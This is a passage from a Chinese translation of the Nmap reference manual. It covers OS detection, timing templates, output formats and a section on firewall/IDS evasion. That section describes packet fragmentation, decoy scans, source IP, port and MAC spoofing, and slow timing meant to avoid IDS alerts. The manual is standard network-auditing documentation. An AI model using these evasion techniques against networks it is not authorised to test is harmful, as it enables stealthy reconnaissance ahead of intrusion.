<p>操作系统检测可以进行其它一些测试，这些测试可以利用处理 过程中收集到的信息。例如运行 时间检测，使用 TCP 时间戳选项(RFC 1323) 来估计主机上次重启的时间，这仅适用于提供这类 信息的主机。另一种 是 TCP 序列号预测分类，用于测试针对远程主机建立一个伪造的 TCP 连接 的可能难度。这对于利用基于源 IP 地址的可信关系(rlogin，防火墙过滤等) 或者隐含源地址 的攻击非常重要。这一类哄骗攻击现在很少见，但一些 主机仍然存在这方面的漏洞。实际的难 度值基于统计采样，因此可能会有 一些波动。通常采用英国的分类较好，如“worthy challenge”或者 “trivial joke”。在详细模式(-v)下只以 普通的方式输出，如果同时使用 -O，还报告 IPID 序列产生号。 很多主机的序列号是“增加”类别，即在每个发送包的 IP 头中 增加 ID 域值， 这对一些先进的信息收集和哄骗攻击来说是个漏洞。</p>
<p><a href="http://www.insecure.org/nmap/osdetect/" target="_blank" rel="external">http://www.insecure.org/nmap/osdetect/</a> 文档使用多种语言描述了版本检测的方式、使用和 定制。</p>
<p>采用下列选项启用和控制操作系统检测:</p>
<p><code>-O</code> (启用操作系统检测)</p>
<p>也可以使用<code>-A</code> 来同时启用操作系统检测和版本检测。</p>
<p><code>--osscan-limit</code> (针对指定的目标进行操作系统检测)</p>
<p>如果发现一个打开和关闭的 TCP 端口时，操作系统检测会更有效。 采用这个选项，Nmap 只对满足这个条件的主机进行操作系统检测，这样可以 节约时间，特别在使用-P0 扫描 多个主机时。这个选项仅在使用 -O 或-A 进行操作系统检测时起作用。</p>
<p><code>--osscan-guess; --fuzzy</code> (推测操作系统检测结果)</p>
<p>当 Nmap 无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap 默认 进行 这种匹配，使用上述任一个选项使得 Nmap 的推测更加有效。</p>
<h2 id="十一、_时间和性能">十一、 时间和性能</h2><p>Nmap 开发的最高优先级是性能。在本地网络对一个主机的默认扫描(nmap hostname)需要 1/5 秒。而仅仅眨眼的时间，就需要扫描上万甚至几十万的主机。此外，一些特定的扫描选项会明 显增加扫描时间，如 UDP 扫描和版本检测。同样，防火墙配置以及特殊的响应速度限制也会增 加时间。Nmap 使用了并行算法和许多先进的算法来加速扫描，用户对 Nmap 如何工作有最终的控 制权。高级用户可以仔细地调整 Nmap 命令，在满足时间要求的同时获得他们所关心的信息。</p>
<p>改善扫描时间的技术有：忽略非关键的检测、升级最新版本的 Nmap(性能增强不断改善)。 优化 时间参数也会带来实质性的变化，这些参数如下。</p>
<p><code>--min-hostgroup &lt;milliseconds&gt;; --max-hostgroup &lt;milliseconds&gt;</code> (调整并行扫描组的大 小)</p>
<p>Nmap 具有并行扫描多主机端口或版本的能力，Nmap 将多个目标 IP 地址空间分成组，然 后在同一时间对一个组进行扫描。通常，大的组更有效。缺点是只有当整个组扫描结束 后才会提供主机的扫描结果。如果组的大小定义为 50，则只有当前 50 个主机扫描结束后 才能得到报告(详细模式中的补充信息除外)。</p>
<p>默认方式下，Nmap 采取折衷的方法。开始扫描时的组较小，最小为 5，这样便于尽快产 生结果；随后增长组的大小，最大为 1024。确切的大小依赖于所给定的选项。为保证效 率，针对 UDP 或少量端口的 TCP 扫描，Nmap 使用大的组。</p>
<p>–max-hostgroup 选项用于说明使用最大的组 Nmap 不会超出这个大小 –min-hostgroup 选项说明最小的组，Nmap 会保持组大于这个值。如果在指定的接口上没有足够的目标主 机来满足所指定的最小值，Nmap 可能会采用比所指定的值小的组。这两个参数虽然很少 使用，但都用于保持组的大小在一个指定的范围之内。</p>
<p>这些选项的主要用途是说明一个最小组的大小，使得整个扫描更加快速。通常选择 256 来扫描 C 类网段。对于端口数较多的扫描，超出该值没有意义。对于端口数较少的扫描 2048 或更大的组大小是有帮助的。</p>
<p><code>--min-parallelism &lt;milliseconds&gt;; --max-parallelism &lt;milliseconds&gt;</code> (调整探测报文的 并行度)</p>
<p>这些选项控制用于主机组的探测报文数量，可用于端口扫描和主机发现。默认状态下， Nmap 基于网络性能计算一个理想的并行度，这个值经常改变。如果报文被丢弃， Nmap 降低速度，探测报文数量减少。随着网络性能的改善，理想的探测报文数量会缓慢增加 这些选项确定这个变量的大小范围。默认状态下，当网络不可靠时，理想的并行度值可 能为 1，在好的条件下，可能会增长至几百。</p>
<p>最常见的应用是–min-parallelism 值大于 1，以加快性能不佳的主机或网络的扫描。这 个选项具有风险，如果过高则影响准确度，同时也会降低 Nmap 基于网络条件动态控制并 行度的能力。这个值设为 10 较为合适，这个值的调整往往作为最后的手段。</p>
<p>–max-parallelism 选项通常设为 1，以防止 Nmap 在同一时间向主机发送多个探测报文 和选择–scan-delay 同时使用非常有用，虽然这个选项本身的用途已经很好。</p>
<p><code>--min_rtt_timeout &lt;milliseconds&gt;， --max-rtt-timeout &lt;milliseconds&gt;</code>，</p>
<p><code>--initial-rtt-timeout &lt;milliseconds&gt;</code> (调整探测报文超时)</p>
<p>Nmap 使用一个运行超时值来确定等待探测报文响应的时间，随后会放弃或重新发送探测 报文。Nmap 基于上一个探测报文的响应时间来计算超时值，如果网络延迟比较显著和不 定，这个超时值会增加几秒。初始值的比较保守(高)，而当 Nmap 扫描无响应的主机时， 这个保守值会保持一段时间。</p>
<p>这些选项以毫秒为单位，采用小的–max-rtt-timeout 值，使 –initial-rtt-timeout 值大于默认值可以明显减少扫描时间，特别是对不能 ping 通的扫描(-P0)以及具有严格 过滤的网络。如果使用太小的值，使得很多探测报文超时从而重新发送，而此时可能响 应消息正在发送，这使得整个扫描的时间会增加。</p>
<p>如果所有的主机都在本地网络，对于–max-rtt-timeout 值来说，100 毫秒比较合适。如 果存在路由，首先使用 ICMP ping 工具 ping 主机，或使用其它报文工具如 hpings，可以 更好地穿透防火墙。查看大约 10 个包的最大往返时间，然后将 –initial-rtt-timeout 设成这个时间的 2 倍，–max-rtt-timeout 可设成这个时间值的 3 倍或 4 倍。通常，不 管 ping 的时间是多少，最大的 rtt 值不得小于 100ms，不能超过 1000ms。</p>
<p>–min_rtt_timeout 这个选项很少使用，当网络不可靠时， Nmap 的默认值也显得过于强 烈，这时这个选项可起作用。当网络看起来不可靠时，Nmap 仅将超时时间降至最小值， 这个情况是不正常的，需要向 namp-dev 邮件列表报告 bug。</p>
<p><code>--host-timeout &lt;milliseconds&gt;</code> (放弃低速目标主机)</p>
<p>由于性能较差或不可靠的网络硬件或软件、带宽限制、严格的防火墙等原因，一些主机需要很长的时间扫描。这些极少数的主机扫描往往占据了大部分的扫描时间。因此，最好的办法是减少时间消耗并且忽略这些主机 使用 –host-timeout 选项来说明等待的时 间(毫秒)。通常使用 1800000 来保证 Nmap 不会在单个主机上使用超过半小时的时间。需 要注意的是，Nmap 在这半小时中可以同时扫描其它主机，因此并不是完全放弃扫描。超 时的主机被忽略，因此也没有针对该主机的端口表、操作系统检测或版本检测结果的输 出。</p>
<p><code>--scan-delay &lt;milliseconds&gt;; --max_scan-delay &lt;milliseconds&gt;</code> (调整探测报文的时间间 隔)</p>
<p>这个选项用于 Nmap 控制针对一个主机发送探测报文的等待时间(毫秒)，在带宽控制的情 况下这个选项非常有效。Solaris 主机在响应 UDP 扫描探测报文报文时，每秒只发送一个 ICMP 消息 因此 Nmap 发送的很多数探测报文是浪费的 –scan-delay 设为 1000 使 Nmap 低速运行。Nmap 尝试检测带宽控制并相应地调整扫描的延迟，但并不影响明确说明何种 速度工作最佳。</p>
<p>–scan-delay 的另一个用途是躲闭基于阈值的入侵检测和预防系统(IDS/IPS)。</p>
<p><code>-T &lt;Paranoid|Sneaky|Polite|Normal|Aggressive|Insane&gt;</code> (设置时间模板)</p>
<p>上述优化时间控制选项的功能很强大也很有效，但有些用户会被迷惑。此外，往往选择合适参数的时间超过了所需优化的扫描时间。因此，Nmap 提供了一些简单的方法，使用 6 个时间模板，使用时采用-T 选项及数字(0 - 5) 或名称。模板名称有 paranoid (0)、 sneaky (1)、polite (2)、normal(3)、 aggressive (4)和 insane (5)。前两种模式用 于 IDS 躲避，Polite 模式降低了扫描速度以使用更少的带宽和目标主机资源。默认模式 为 Normal，因此-T3 实际上是未做任何优化。Aggressive 模式假设用户具有合适及可靠 的网络从而加速扫描。Insane 模式假设用户具有特别快的网络或者愿意为获得速度而牺 牲准确性。</p>
<p>用户可以根据自己的需要选择不同的模板，由 Nmap 负责选择实际的时间值。模板也会针 对其它的优化控制选项进行速度微调。例如，-T4 针对 TCP 端口禁止动态扫描延迟超过 10ms，-T5 对应的值为 5ms。模板可以和优化调整控制选项组合使用，但模板必须首先指 定，否则模板的标准值会覆盖用户指定的值。建议在扫描可靠的网络时使用 -T4，即使 在自己要增加优化控制选项时也使用(在命令行的开始)，从而从这些额外的较小的优化 中获益。</p>
<p>如果用于有足够的带宽或以太网连接，仍然建议使用-T4 选项。有些用户喜欢-T5 选项， 但这个过于强烈。有时用户考虑到避免使主机崩溃或者希望更礼貌一些会采用-T2 选项 他们并没意识到-T Polite 选项是如何的慢，这种模式的扫描比默认方式实际上要多花 10 倍的时间。默认时间选项(-T3)很少有主机崩溃和带宽问题，比较适合于谨慎的用户 不进行版本检测比进行时间调整能更有效地解决这些问题。</p>
<p>虽然-T0 和-T1 选项可能有助于避免 IDS 告警，但在进行上千个主机或端口扫描时，会显 著增加时间。对于这种长时间的扫描，宁可设定确切的时间值，而不要去依赖封装的-T0 和-T1 选项。</p>
<p>T0 选项的主要影响是对于连续扫描，在一个时间只能扫描一个端口，每个探测报文的发 送间隔为 5 分钟 T1 和 T2 选项比较类似 探测报文间隔分别为 15 秒和 0.4 秒 T3 是 Nmap 的默认选项，包含了并行扫描。 T4 选项与 <code>--max-rtt-timeout 1250 --initial-rtt-timeout 500</code> 等价，最大 TCP 扫描延迟为 10ms。T5 等价于 <code>--max-rtt-timeout 300 --min_rtt_timeout 50 --initial-rtt-timeout 250 --host-timeout 900000</code>，最大 TCP 扫描延迟为 5ms。</p>
<h2 id="十二、_防火墙/IDS_躲避和哄骗">十二、 防火墙/IDS 躲避和哄骗</h2><p>很多 Internet 先驱们设想了一个全球开放的网络，使用全局的 IP 地址空间，使得任何两个节 点之间都有虚拟连接。这使得主机间可以作为真正的对等体，相互间提供服务和获取信息。人 们可以在工作时访问家里所有的系统、调节空调温度、为提前到来的客人开门。随后，这些全 球连接的设想受到了地址空间短缺和安全考虑的限制。在 90 年代早期，各种机构开始部署防火 墙来实现减少连接的目的，大型网络通过代理、NAT 和包过滤器与未过滤的 Internet 隔离。不 受限的信息流被严格控制的可信通信通道信息流所替代。</p>
<p>类似防火墙的网络隔离使得对网络的搜索更加困难，随意的搜索变得不再简单。然而，Nmap 提 供了很多特性用于理解这些复杂的网络，并且检验这些过滤器是否正常工作。此外，Nmap 提供 了绕过某些较弱的防范机制的手段。检验网络安全状态最有效的方法之一是尝试哄骗网络，将 自己想象成一个攻击者，使用本节提供的技术来攻击自己的网络。如使用 FTP bounce 扫描、Idle 扫描、分片攻击或尝试穿透自己的代理。</p>
<p>除限止网络的行为外，使用入侵检测系统(IDS)的公司也不断增加。由于 Nmap 常用于攻击前期 的扫描，因此所有主流的 IDS 都包含了检测 Nmap 扫描的规则。现在，这些产品变形为入侵预防 系统(IPS)，可以主动地阻止可疑的恶意行为。不幸的是，网络管理员和 IDS 厂商通过分析报文 来检测恶意行为是一个艰苦的工作，有耐心和技术的攻击者，在特定 Nmap 选项的帮助下，常常 可以不被 IDS 检测到。同时，管理员必须应付大量的误报结果，正常的行为被误判而被改变或 阻止。</p>
<p>有时，人们建议 Nmap 不应该提供躲闭防火墙规则或哄骗 IDS 的功能，这些功能可能会被攻击者 滥用，然而管理员却可以利用这些功能来增强安全性。实际上，攻击的方法仍可被攻击者利用 他们可以发现其它工具或 Nmap 的补丁程序。同时，管理员发现攻击者的工作更加困难，相比较 采取措施来预防执行 FTP Bounce 攻击的工具而言，部署先进的、打过补丁的 FTP 服务器更加有 效。</p>
<p>Nmap 不提供检测和破坏防火墙及 IDS 系统的魔弹(或 Nmap 选项)，它使用的是技术和经验，这超 出了本参考手册的范围，下面描述了相关的选项和完成的工作。</p>
<p><code>-f</code> (报文分段); <code>--mtu</code> (使用指定的 MTU)</p>
<p>-f 选项要求扫描时(包挺 ping 扫描)使用 小的 IP 包分段 其思路是将 TCP 头分段在几个 包中，使得包过滤器、 IDS 以及其它工具的检测更加困难。必须小心使用这个选项，有 些系 统在处理这些小包时存在问题，例如旧的网络嗅探器 Sniffit 在接收 到第一个分 段时会立刻出现分段错误。该选项使用一次，Nmap 在 IP 头后将包分成 8 个字节或更小 因此，一个 20 字节的 TCP 头会被分成 3 个 包，其中 2 个包分别有 TCP 头的 8 个字节， 另 1 个包有 TCP 头的剩下 4 个字 节 当然 每个包都有一个 IP 头 再次使用-f 可使用 16 字节的分段(减少分段数量)。使用–mtu 选项可 以自定义偏移的大小，使用时不需要-f 偏移量必须 是 8 的倍数。包过滤器和防火墙对所有的 IP 分段排队，如 Linux 核心中的 CONFIG_IP_ALWAYS_DEFRAG 配置项，分段包不会直接使用。一些网络无法 承受这样所带 来的性能冲击，会将这个配置禁止。其它禁止的原因有分段 包会通过不同的路由进入网 络。一些源系统在内核中对发送的报文进行 分段，使用 iptables 连接跟踪模块的 Linux 就是一个例子。当使用类似 Ethereal 的嗅探器时，扫描必须保证发送的报文要分段。如 果主机操作系统会产 生问题 尝试使用–send-eth 选项以避开 IP 层而直接 发送原始的 以太网帧。</p>
<p><code>-D &lt;decoy1 [，decoy2][，ME]，...&gt;</code> (使用诱饵隐蔽扫描)</p>
<p>为使诱饵扫描起作用，需要使远程主机认为是诱饵在扫描目标网络。 IDS 可能会报个某 个 IP 的 5-10 个端口扫描，但并不知道哪个 IP 在扫描以及 哪些不是诱饵。但这种方式 可以通过路由跟踪、响应丢弃以及其它主动 机制在解决。这是一种常用的隐藏自身 IP 地址的有效技术。</p>
<p>使用逗号分隔每个诱饵主机，也可用自己的真实 IP 作为诱饵，这时可使用 ME 选项说明 如果在第 6 个位置或 更后的位置使用 ME 选项，一些常用 端口扫描检测器(如 Solar Designer’s excellent scanlogd)就不会报告 这个真实 IP 如果不使用 ME 选项 Nmap 将 真实 IP 放在一个随机的位置</p>
<p>注意，作为诱饵的主机须在工作状态，否则会导致目标主机的 SYN 洪水攻击。 如果在网 络中只有一个主机在工作，那就很容易确定哪个主机在扫描。也可 使用 IP 地址代替主 机名(被诱骗的网络就不可能在名字服务器日志中发现)。</p>
<p>诱饵可用在初始的 ping 扫描(ICMP、SYN、ACK 等)阶段或真正的端口扫描 阶段。诱饵也 可以用于远程操作系统检测(-O)。在进行版 本检测或 TCP 连接扫描时，诱饵无效。</p>
<p>使用过多的诱饵没有任何价值，反而导致扫描变慢并且结果不准确。 此外，一些 ISP 会 过滤哄骗的报文，但很多对欺骗 IP 包没有任何限制。</p>
<p><code>-S &lt;IP_Address&gt;</code> (源地址哄骗)</p>
<p>在某些情况下，Nmap 可能无法确定你的源地址(如果这样，Nmap 会给出 提示)。此时， 使用-S 选项并说明所需发送包的接口 IP 地址。</p>
<p>这个标志的另一个用处是哄骗性的扫描，使得目标认为是另 一个地址在进行扫描。可以 想象某一个竞争对手在不断扫描某个公司！ -e 选项常在这种情况下使用，也可采用-P0 选项。</p>
<p><code>-e &lt;interface&gt;</code> (使用指定的接口)</p>
<p>告诉 Nmap 使用哪个接口发送和接收报文，Nmap 可以进行自动检测， 如果检测不出会给 出提示。</p>
<p><code>--source-port &lt;portnumber&gt;; -g &lt;portnumber&gt;</code> (源端口哄骗)</p>
<p>仅依赖于源端口号就信任数据流是一种常见的错误配置，这个问题非常好理解。例如一个管理员部署了一个新的防火墙，但招来了很多用户的不满，因为他们的应用停止工作了。可能是由于外部的 UDP DNS 服务器响应无法进入网络，而导致 DNS 的崩溃。FTP 是 另一个常见的例子，在 FTP 传输时，远程服务器尝试和内部用建立连接以传输数据。</p>
<p>对这些问题有安全解决方案，通常是应用级代理或协议分析防火墙模块。但也存在一些 不安全的方案。注意到 DNS 响应来自于 53 端口，FTP 连接来自于 20 端口，很多管理员会 掉入一个陷阱，即允许来自于这些端口的数据进入网络。他们认为这些端口里不会有值得注意的攻击和漏洞利用。此外，管理员或许认为这是一个短期的措施，直至他们采取 更安全的方案。但他们忽视了安全的升级。</p>
<p>不仅仅是工作量过多的网络管理员掉入这种陷阱，很多产品本身也会有这类不安全的隐 患，甚至是微软的产品。Windows 2000 和 Windows XP 中包含的 IPsec 过滤器也包含了一 些隐含规则，允许所有来自 88 端口(Kerberos)的 TCP 和 UDP 数据流。另一个常见的例子 是 Zone Alarm 个人防火墙到 2.1.25 版本仍然允许源端口 53(DNS)或 67(DHCP)的 UDP 包 进入。</p>
<p>Nmap 提供了-g 和–source-port 选项(它们是等价的)，用于利用上述弱点。只需要提供 一个端口号，Nmap 就可以从这些端口发送数据。为使特定的操作系统正常工作，Nmap 必 须使用不同的端口号。 DNS 请求会忽略–source-port 选项，这是因为 Nmap 依靠系统库 来处理。大部分 TCP 扫描，包括 SYN 扫描，可以完全支持这些选项，UDP 扫描同样如此</p>
<p><code>--data-length &lt;number&gt;</code> (发送报文时 附加随机数据)</p>
<p>正常情况下 Nmap 发送最少的报文 只含一个包头 因此 TCP 包通常 是 40 字节 ICMP ECHO 请求只有 28 字节。这个选项告诉 Nmap 在发送的报文上 附加指定数量的随机字节。操作 系统检测(-O)包不受影响， 但大部分 ping 和端口扫描包受影响，这会使处理变慢，但 对扫描的影响较小。</p>
<p><code>--ttl &lt;value&gt;</code> (设置 IP time-to-live 域)</p>
<p>设置 IPv4 报文的 time-to-live 域为指定的值。</p>
<p><code>--randomize-hosts</code> (对目标主机的顺序随机排列)</p>
<p>告诉 Nmap 在扫描主机前对每个组中的主机随机排列，最多可达 8096 个主机。这会使得 扫描针对不同的网络监控系统来说变得不是很 明显，特别是配合值较小的时间选项时更 有效。如果需要对一个较大 的组进行随机排列，需要增大 nmap.h 文件中 PING_GROUP_SZ 的值，并重新编译。另一种方法是使用列表扫描 (-sL -n -oN filename)，产生目标 IP 的列表， 使用 Perl 脚本进行随机化，然后使用-iL 提供给 Nmap。</p>
<p><code>--spoof-mac &lt;mac address，prefix，or vendor name&gt;</code> (MAC 地址哄骗)</p>
<p>要求 Nmap 在发送原以太网帧时使用指定的 MAC 地址 这个选项隐含了 –send-eth 选项 以保证 Nmap 真正发送以太网包。MAC 地址有几 种格式。如果简单地使用字符串“0”， Nmap 选择一个完全随机的 MAC 地址 如果给定的字符品是一个 16 进制偶数(使用:分隔) Nmap 将使用这个 MAC 地址。 如果是小于 12 的 16 进制数字，Nmap 会随机填充剩下的 6 个字节。如果参数不是 0 或 16 进 制字符串，Nmap 将通过 nmap-mac-prefixes 查找 厂商 的名称(大小写区分)，如果找到匹配，Nmap 将使用厂商的 OUI(3 字节前缀)，然后 随机 填充剩余的 3 个节字。正确的–spoof-mac 参数有， Apple， 0，01:02:03:04:05:06， deadbeefcafe，0020F2， 和 Cisco.</p>
<h2 id="十三、_输出">十三、 输出</h2><p>任何安全工具只有在输出结果时才是有价值的，如果没有通过组织和 易于理解的方式来表达， 复杂的测试和算法几乎没有意义。Nmap 提供了一些 方式供用户和其它软件使用，实际上，没有 一种方式可以使所有人满意。 因此 Nmap 提供了一些格式，包含了方便直接查看的交互方式和 方便软件处理 的 XML 格式。</p>
<p>除了提供输出格式外，Nmap 还提供了选项来控制输出的细节以及调试信息。输出内容可发送给 标准输出或命名文件，可以追加或覆盖。输出文件还可被用于继续中断的扫描。</p>
<p>Nmap 提供 5 种不同的输出格式。默认的方式是 interactive output，发送给标准输出(stdout) normal output 方式类似于 interactive，但显示较少的运行时间信息和告警信息，这是由于这 些信息是在扫描完全结束后用于分析，而不是交互式的。</p>
<p>XML 输出是最重要的输出类型，可被转换成 HTML，对于程序处理非常方便，如用于 Nmap 图形用 户接口或导入数据库。</p>
<p>另两种输出类型比较简单，grepable output 格式，在一行中包含目标主机最多的信息；sCRiPt KiDDi3 0utPUt 格式，用于考虑自己的用户 |&lt;-r4d。</p>
<p>交互式输出是默认方式，没有相应的命令行选项，其它四种格式选项使用相同的语法，采用一 个参数，即存放结果的文件名。多种格式可同时使用，但一种格式只能使用一次。例如，在标 准输出用于查看的同时，可将结果保存到 XML 文件用于程序分析，这时可以使用选项-oX myscan.xml -oN myscan.nmap。为便于描述的简化，本章使用类似于 myscan.xml 的简单文件名 建议采用更具有描述性的文件名。文件名的选择与个人喜好有关，建议增加扫描日期以及一到 两个单词来描述，并放置于一个目录中。</p>
<p>在将结果输出到文件的同时，Nmap 仍将结果发送给标准输出。例如，命令 nmap -oX myscan.xml target 将输出 XML 至 myscan.xml，并在 stdout 上打印相同的交互式结果，而此时-oX 选项没 有采用。可以使用连字符作为选项来改变，这使得 Nmap 禁止交互式输出，而是将结果打印到所 指定的标准输出流中。因此，命令 nmap -oX - target 只输出 XML 至标准输出 stdout。严重错 误仍然是输出到标准错误流 stderr 中。</p>
<p>与其它 Nmap 参数不同，日志文件选项的空格(如-oX)和文件名或连字符是必需的。如果省略了 标记，例如-oG-或 -oXscan.xml，Nmap 的向后兼容特点将建立 标准格式的输出文件，相应的文 件名为 G-和 Xscan.xml。</p>
<p>Nmap 还提供了控制扫描细节以及输出文件的添加或覆盖的选项，这些选项如下所述。 Nmap 输出格式</p>
<p><code>-oN &lt;filespec&gt;</code> (标准输出)</p>
<p>要求将标准输出直接写入指定 的文件。如上所述，这个格式与交互式输出 略有不同。</p>
<p><code>-oX &lt;filespec&gt;</code> (XML 输出)</p>
<p>要求 XML 输出直接写入指定 的文件。Nmap 包含了一个文档类型定义(DTD)，使 XML 解析 器有效地 进行 XML 输出。这主要是为了程序应用，同时也可以协助人工解释 Nmap 的 XML 输出。DTD 定义了合法的格式元素，列举可使用的属性和 值。最新的版本可在 <a href="http://www.insecure.org/nmap/data/nmap.dtd" target="_blank" rel="external">http://www.insecure.org/nmap/data/nmap.dtd</a> 获取。</p>
<p>XML 提供了可供软件解析的稳定格式输出，主要的计算机 语言都提供了免费的 XML 解析 器，如 C/C++，Perl，Python 和 Java。 针对这些语言有一些捆绑代码用于处理 Nmap 的 输出和特定的执行程序。 例如 perl CPAN 中的 <a href="http://sourceforge.net/projects/nmap-scanner/" target="_blank" rel="external">Nmap::Scanner</a> 和 <a href="http://www.nmapparser.com/" target="_blank" rel="external">Nmap::Parser</a>。 对几 乎所有与 Nmap 有接口的主要应用来说，XML 是首选的格式。</p>
<p>XML 输出引用了一个 XSL 样式表，用于格式化输出结果，类似于 HTML。最方便的方法是 将 XML 输出加载到一个 Web 浏览器，如 Firefox 或 IE。由于 nmap.xsl 文件的绝对 路径 因此通常只能在运行了 Nmap 的机器上工作(或类似配置的机器)。 类似于任何支持 Web 机器的 HTML 文件，–stylesheet 选项可用于建立可移植的 XML 文件。</p>
<p><code>-oS &lt;filespec&gt;</code> (ScRipT KIdd|3 oUTpuT)</p>
<p>脚本小子输出类似于交互工具输出，这是一个事后处理，适合于 ‘l33t HaXXorZ， 由于原来全都是大写的 Nmap 输出。这个选项和脚本小子开了玩笑，看上去似乎是为了 “帮助他们”。</p>
<p><code>-oG &lt;filespec&gt;</code> (Grep 输出)</p>
<p>这种方式最后介绍，因为不建议使用。XML 输格式很强大，便于有经验的用户使用。XML 是一种标准，由许多解析器构成，而 Grep 输届更简化。XML 是可扩展的，以支持新发布 的 Nmap 特点。使用 Grep 输出的目的是忽略这些特点，因为没有足够的空间。</p>
<p>然面，Grep 输出仍然很常使用。它是一种简单格式，每行一个主机，可以通过 UNIX 工具 (如 grep、awk、cut、sed、diff)和 Perl 方便地查找和分解。常可用于在命令行上进行 一次性测式。查找 ssh 端口打开或运行 Sloaris 的主机，只需要一个简单的 grep 主机说 明，使用通道并通过 awk 或 cut 命令打印所需的域。</p>
<p>Grep 输出可以包含注释(每行由#号开始)。每行由 6 个标记的域组成，由制表符及冒号分 隔。这些域有主机，端口， 协议，忽略状态， 操作系统，序列号， IPID 和状态。</p>
<p>这些域中最重要的是 Ports，它提供了所关注的端口的细节，端口项由逗号分隔。每个端 口项代表一个所关注的端口，每个子域由/分隔。这些子域有：端口号， 状态，协议， 拥 有者，服务， SunRPCinfo 和版本信息。</p>
<p>对于 XML 输出，本手册无法列举所有的格式，有关 Nmap Grep 输出的更详细信息可查阅 <a href="http://www.unspecific.com/nmap-oG-output" target="_blank" rel="external">http://www.unspecific.com/nmap-oG-output</a>。</p>
<p><code>-oA &lt;basename&gt;</code> (输出至所有格式)</p>
<p>为使用方便，利用-oAbasename 选项 可将扫描结果以标准格式、XML 格式和 Grep 格式一 次性输出。分别存放在 basename.nmap，basename.xml 和 basename.gnmap 文件中。也 可以在文件名前 指定目录名，如在 UNIX 中，使用~/nmaplogs/foocorp/， 在 Window 中 使用 c:\hacking\sco on Windows。</p>
<h3 id="细节和调试选项">细节和调试选项</h3><p><code>-v</code> (提高输出信息的详细度)</p>
<p>通过提高详细度，Nmap 可以输出扫描过程的更多信息。 输出发现的打开端口，若 Nmap 认为扫描需要更多时间会显示估计 的结束时间。这个选项使用两次，会提供更详细的信 息。这个选 项使用两次以上不起作用。</p>
<p>大部分的变化仅影响交互式输出，也有一些影响标准和脚本 小子输出。其它输出类型由 机器处理，此时 Nmap 默认提供详细的信 息，不需要人工干预。然而，其它模式也会有 一些变化，省略一些 细节可以减小输出大小。例如，Grep 输出中的注释行提供所有扫描 端口列表，但由于这些信息过长，因此只能在细节模式中输出。</p>
<p><code>-d [level]</code> (提高或设置调试级别)</p>
<p>当详细模式也不能为用户提供足够的数据时，使用调试可以得到更多的信息。使用细节选项(-v)时，可启用命令行参数 (-d)，多次使用可提高调试级别。也可在-d 后面使用参数设置调试级别。例如，-d9 设定级别 9。这是最高的级别，将会产生上千行的输出， 除非只对很少的端口和目标进行简单扫描。</p>
<p>如果 Nmap 因为 Bug 而挂起或者对 Namp 的工作及原理有疑问，调试输出非常有效。主要 是开发人员用这个选项，调试行不具备自我解释的特点。例如，<code>Timeoutvals: srtt: -1 rttvar: -1 to: 1000000 delta 14987 ==&gt; srtt: 14987 rttvar: 14987 to: 100000</code>。 如果对某行输出不明白，可以忽略、查看源代码或向开发列表(nmap-dev)求助。有些输 出行会有自我解释的特点，但随着调试级别的升高，会越来越含糊。</p>
<p><code>--packet-trace</code> (跟踪发送和接收的报文)</p>
<p>要求 Nmap 打印发送和接收的每个报文的摘要，通常用于 调试，有助于新用户更好地理 解 Nmap 的真正工作。为避免输出过 多的行，可以限制扫描的端口数，如-p20-30。 如 果只需进行版本检测，使用–version-trace。</p>
<p><code>--iflist</code> (列举接口和路由)</p>
<p>输出 Nmap 检测到的接口列表和系统路由，用于调试路由 问题或设备描述失误(如 Nmap 把 PPP 连接当作以太网对待)。</p>
<h3 id="其它输出选项">其它输出选项</h3><p><code>--append-output</code> (在输出文件中添加)</p>
<p>当使用文件作为输出格式，如-oX 或-oN， 默认该文件被覆盖。如果希望文件保留现有内 容，将结果添加在现 有文件后面，使用–append-output 选项。所有指 定的输出文件都 被添加。但对于 XML(-oX)扫描输出 文件无效，无法正常解析，需要手工修改。</p>
<p><code>--resume &lt;filename&gt;</code> (继续中断的扫描)</p>
<p>一些扩展的 Nmap 运行需要很长的时间 – 以天计算，这类扫描 往往不会结束。可以进 行一些限制，禁止 Nmap 在工作时间运行，导致 网络中断、运行 Nmap 的主机计划或非计 划地重启、或者 Nmap 自己中断。 运行 Nmap 的管理员可以因其它原因取消运行，按下 ctrl-C 即可。从头开始启动扫描可能令人不快，幸运的是，如果标准扫描 (-oN)或 Grep 扫描(-oG)日志 被保留，用户可以要求 Nmap 恢复终止的扫描，只需要简单地使用选项</p>
<p>–resume 并说明标准/Grep 扫描输出文件，不允许 使用其它参数，Nmap 会解析输出文件 并使用原来的格式输出。使用方式 如 nmap –resume logfilename。 Nmap 将把新地结 果添加到文件中 这种方式不支持 XML 输出格式 原因是 将两次运行结果合并至一个 XML 文件比较困难。</p>
<p><code>--stylesheet &lt;path or URL&gt;</code> (设置 XSL 样式表，转换 XML 输出)</p>
<p>Nmap 提从了 XSL 样式表 nmap.xsl，用于查看 或转换 XML 输出至 HTML。XML 输出包含了 一个 xml-stylesheet， 直接指向 nmap.xml 文件， 该文件由 Nmap 安装(或位于 Windows 当前工作目录)。在 Web 浏览器 中打开 Nmap 的 XML 输出时，将会在文件系统中寻找 nmap.xsl 文件， 并使用它输出结果。如果希望使用不同的样式表，将它作为</p>
<p>–stylesheet 的参数，必段指明完整的路 径或 URL，常见的调用方式是–stylesheet <a href="http://www.insecure.org/nmap/data/nmap.xsl" target="_blank" rel="external">http://www.insecure.org/nmap/data/nmap.xsl</a> 。 这告诉浏览器从 Insecire.Org 中加 载最新的样式表。这使得 没安装 Nmap(和 nmap.xsl) 的机器中可以方便地查看结果。因 此，URL 更方便使用，本地文件系统 的 nmap.xsl 用于默认方式。</p>
<p><code>--no_stylesheet</code> (忽略 XML 声明的 XSL 样式表)</p>
<p>使用该选项禁止 Nmap 的 XML 输出关联任何 XSL 样式表。 xml-stylesheet 指示被忽略。</p>
<h2 id="十四、_其它选项">十四、 其它选项</h2><p>本节描述一些重要的(和并不重要)的选项，这些选项 不适合其它任何地方。</p>
<p><code>-6</code> (启用 IPv6 扫描)</p>
<p>从 2002 年起，Nmap 提供对 IPv6 的一些主要特征的支持。ping 扫描(TCP-only)、 连接 扫描以及版本检测都支持 IPv6。除增加-6 选项外， 其它命令语法相同。当然，必须使 用 IPv6 地址来替换主机名，如 3ffe:7501:4819:2000:210:f3ff:fe03:14d0。 除“所关 注的端口”行的地址部分为 IPv6 地址。</p>
<p>IPv6 目前未在全球广泛采用，目前在一些国家(亚洲)应用较多， 一些高级操作系统支持 IPv6。使用 Nmap 的 IPv6 功能，扫描的源和目 的都需要配置 IPv6。如果 ISP(大部分)不</p>
